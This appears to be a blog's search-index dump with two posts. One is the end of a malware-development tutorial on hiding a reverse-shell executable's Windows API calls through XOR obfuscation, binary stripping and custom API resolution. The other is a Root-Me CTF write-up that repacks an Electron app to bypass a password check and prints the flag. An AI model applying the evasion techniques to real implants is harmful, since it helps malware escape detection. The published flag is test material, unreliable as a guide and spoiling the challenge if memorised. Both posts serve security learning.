reverse-shell.exe I just obfuscated a bit the powershell payload with a simple xor and compile it with the -s flag to strip our PE. Stripping a PE means to discard these debugging symbols (like the function name). Stripping a binary reduces its size on the disk and makes it a little more difficult to debug and reverse engineer.\nour main function now :\nand our own GetProcAddress is a bit hard to recognize (of course an experimented reverse engineer will recognize it easily):\nThe WinExec and GetProcAddress functions are now totally absent in the IAT.\nConclusion That\u0026rsquo;s all for this post, I hope you enjoyed it. If I said some things wrong or if I made any mistake feel free to report them to me. Same, if you don\u0026rsquo;t understand something contact me on Discord or Twitter. I will be happy to help you. Next time we will see how to make our own GetModuleHandle by parsing the Process Block Environment and make a PE without an import table.\n","permalink":"https://trikkss.github.io/posts/hiding_windows_api_calls_part1/","summary":"Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API.","title":"Malware - Windows API hashing 1"},{"content":"PROTONIC VAULT Hello, today i will explain how i solved the Protonic Vault challenge from the Root-Me capture the flag.\nChallenge content user@debian:~/protonic_vault$ tree protonic-vault\rprotonic-vault\r├── chrome_100_percent.pak\r├── chrome_200_percent.pak\r├── d3dcompiler_47.dll\r├── ffmpeg.dll\r├── icudtl.dat\r├── libEGL.dll\r├── libGLESv2.dll\r├── LICENSE\r├── LICENSES.chromium.html\r├── locales\r│ ├── af.pak\r│ ├── am.pak\r│ ├── ar.pak\r│ ├── bg.pak\r│ ├── bn.pak\r│ ├── ca.pak\r│ ├── cs.pak\r│ ├── da.pak\r[...]\r│ ├── te.pak\r│ ├── th.pak\r│ ├── tr.pak\r│ ├── uk.pak\r│ ├── ur.pak\r│ ├── vi.pak\r│ ├── zh-CN.pak\r│ └── zh-TW.pak\r├── protonic-vault.exe\r├── resources\r│ └── app.asar\r├── resources.pak\r├── snapshot_blob.bin\r├── v8_context_snapshot.bin\r├── version\r├── vk_swiftshader.dll\r├── vk_swiftshader_icd.json\r└── vulkan-1.dll Let\u0026rsquo;s uncompress the protonic-vault.zip file given for this challenge and execute protonic-vault.exe.\nThe application asks a password. Obviously, we don\u0026rsquo;t know it. I tried to reverse engineer this executable but it was hard. So i decided to look at the other files. The resources/app.asar file seemed interesting. After some google research I deduced that this application was an electron application. We can found the official github of Asar here\nSo let\u0026rsquo;s decompile this app.asar file !\nAsar decompilation We must first install asar. We can do it with this command.\nnpm install --engine-strict @electron/asar and now let\u0026rsquo;s extract this archive.\nuser@debian:~/protonic_vault/protonic-vault/resources$ asar --help\rUsage: asar [options] [command]\rManipulate asar archive files\rOptions:\r-V, --version output the version number\r-h, --help display help for command\rCommands:\rpack|p [options] \u0026lt;dir\u0026gt; \u0026lt;output\u0026gt; create asar archive\rlist|l [options] \u0026lt;archive\u0026gt; list files of asar archive\rextract-file|ef \u0026lt;archive\u0026gt; \u0026lt;filename\u0026gt; extract one file from archive\rextract|e \u0026lt;archive\u0026gt; \u0026lt;dest\u0026gt; extract archive\r*\rhelp [command] display help for command\ruser@debian:~/protonic_vault/protonic-vault/resources$ asar extract app.asar app_extracted\ruser@debian:~/protonic_vault/protonic-vault/resources$ ls\rapp.asar app_extracted\ruser@debian:~/protonic_vault/protonic-vault/resources$ ls app_extracted/\rimg index.html node_modules package.json src styles Nice ! Here is the extracted the source code of our application. The src/ folder seems interesting.\nsrc/\r├── main.js\r├── preload.js\r├── renderer.js\r└── window.jsc In the renderer.js file we can recognize our login form.\nasync function setupHandler() { let truePassword = await window.electronAPI.getPassword() document.getElementById(\u0026#34;passForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, async e =\u0026gt; { e.preventDefault() const passwordInput = document.getElementById(\u0026#34;password\u0026#34;) const password = passwordInput.value const resultDiv = document.getElementById(\u0026#34;result\u0026#34;) resultDiv.hidden = false if (password === truePassword) { resultDiv.innerHTML = `Welcome, dear master!\u0026lt;br/\u0026gt;Flag: ${await window.electronAPI.getFlag()}` resultDiv.className = \u0026#34;notification is-success\u0026#34; } else { resultDiv.textContent = \u0026#34;You\u0026#39;re wrong!!\u0026#34; resultDiv.className = \u0026#34;notification is-danger\u0026#34; } }) } setupHandler() The method window.electronAPI.getPassword() ask for the password. It means that our password is located in the window.jsc file, but this file is compiled into v8 bytecode.\nApplication patching I was very lazy to decompile it so I had another idea. If we patch the renderer.js file and compile it again into an other app.asar will this work? I tried. This is our new renderer.js file.\nasync function setupHandler() { let truePassword = await window.electronAPI.getPassword() document.getElementById(\u0026#34;passForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, async e =\u0026gt; { e.preventDefault() const passwordInput = document.getElementById(\u0026#34;password\u0026#34;) const password = passwordInput.value const resultDiv = document.getElementById(\u0026#34;result\u0026#34;) resultDiv.hidden = false resultDiv.innerHTML = `Welcome, dear master!\u0026lt;br/\u0026gt;Flag: ${await window.electronAPI.getFl\u0026gt; resultDiv.className = \u0026#34;notification is-success\u0026#34; }) } setupHandler() I just removed the condition. We compile again our patched application.\nuser@debian:~/protonic_vault/protonic-vault/resources$ asar pack app_extracted/ new_app.asar and we replace the old app.asar with our new file.\nFlag Then we executed again the protonic-vault.exe, click on submit with any password and it works ! we are login and we can get the flag.\nFlag : RM{V8_byt3c0d3_1s_n0t_3n0ugh}\nGreetings Thanks to Root-Me and Elf for this challenge. I am very glad about it being interesting at all because it was the first time I reverse engineer this type of application.\n","permalink":"https://trikkss.github.io/posts/protonic-vault-wu/","summary":"Write up of the Protonic Vault challenge from the 10k Root-Me CTF.","title":"Protonic Vault write up"}]